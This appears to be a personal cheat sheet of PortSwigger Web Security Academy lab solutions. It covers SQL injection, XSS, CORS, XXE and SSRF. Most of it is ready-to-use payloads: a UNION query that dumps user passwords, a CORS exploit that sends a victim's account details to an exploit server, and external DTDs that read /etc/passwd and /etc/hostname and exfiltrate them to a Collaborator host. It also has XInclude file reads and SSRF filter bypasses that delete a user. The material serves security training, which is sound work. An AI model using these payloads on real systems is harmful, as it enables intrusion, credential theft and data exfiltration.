## SQLi Vulnerabilities:
Check if stock check features is XML. Check if value inside XML can be modified and if UNION SELECT will work

```
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```

---

## XSS Vulnerabilities

```
/product?productId=1&storeId=</option><script>alert();</script>
```


---


## CORS Vulnerabilities:
- ==CORS vulnerability with trusted insecure protocols== 
  1. Response contains the `Access-Control-Allow-Credentials`
  2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
  3. Open a product page, click **Check stock** and observe that it is loaded using a HTTP URL on a subdomain. Observe that the `productID` parameter is vulnerable to XSS.
  4. ```
     <script> document.location="http://stock.lab_id.web-security-academy.net/?productId=4%3cscript>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://lab_id.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-exploit_id.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
     ```

--- 
## XXE Vulnerabilities:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE food [<!ENTITY xxx SYSTEM "http://burp_collab.oastify.com"> ]>
<stockCheck><productId>&xxx;</productId><storeId>1</storeId></stockCheck>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE food [<!ENTITY % xxx SYSTEM "http://burp_collab.oastify.com" > %xxx; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
==Exploiting blind XXE to exfiltrate data using a malicious external DTD== 
  FIlename should be exploit.dtd to match what is in the payload on the Exploit server with the following body:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://burp_collab.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```
  
  submit the following XXE payload to the vulnerable application:
```
<!DOCTYPE food [<!ENTITY % xxx SYSTEM "https://exploit_id.exploit-server.net/exploit.dtd"> %xxx;]>
```
- ==Exploiting blind XXE to retrieve data via error messages== 
``` 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file://foodbar/%file;'>" >

%eval;
%error;
```
  
  In the stock check feature:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE food [<!ENTITY % xxx SYSTEM "https://exploit_id.exploit-server.net/exploit"> %xxx; ]>
<stockCheck>\<productId>1\</productId>\<storeId>1\</storeId>\</stockCheck>
```
- ==Exploiting XInclude to retrieve files== 
  Test if it parses  XML:
  %26entity = &entity which is referencing an entity in XML
  ![[Pasted image 20260331174849.png]]
  
  productId=1<food xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></food>&storeId=1

```
productId=1<food xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></food>&storeId=1

productId=<food+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></food>&storeId=1
```

- ==Discovering vulnerabilities quickly with targeted scanning==
  
--- 
## SSRF Vulnerabilities:
- ==SSRF with blacklist-based input filter== - Experiment with different forms of localhost: e.g.: Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1 and case variation for /admin, e.g. /Admin. 
  Check stock, then change request body to:
  stockApi=http://127.1/Admin/delete?username=carlos
- ==SSRF with whitelist-based input filter== - stockApi=http://localhost:80%2523@stock.weliketoshopcom/admin/
- ==Download report as PDF== - `<iframe src='http://localhost:port/file' height='100' width='100'>`
  https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/

